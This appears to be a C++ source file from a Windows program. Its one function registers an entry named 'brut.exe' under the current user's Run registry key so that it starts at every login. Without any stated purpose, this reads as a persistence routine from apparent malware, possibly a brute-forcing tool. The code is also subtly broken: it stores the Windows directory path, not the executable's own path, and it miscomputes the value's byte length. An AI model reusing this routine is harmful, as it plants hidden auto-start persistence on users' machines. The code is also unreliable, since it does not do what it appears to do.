#include "autorun.h"

#define STRLEN(x) (sizeof(x)/sizeof(TCHAR) - 1)

BOOL Autorun::selfAutorun() {
  TCHAR szExeName[MAX_PATH+1];
  TCHAR szWinPath[MAX_PATH+1];
  GetModuleFileName(NULL, szExeName, STRLEN(szExeName));
  GetWindowsDirectory(szWinPath, STRLEN(szWinPath));
  HKEY hKey;
  DWORD action;
  if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL,  REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
            &hKey, &action)) {
	RegSetValueEx(hKey, L"brut.exe", 0, REG_SZ, (PBYTE)szWinPath,
				   lstrlen(szWinPath)*sizeof(TCHAR) + 1);
	RegCloseKey(hKey);
	return TRUE;
  }  
  return FALSE;
}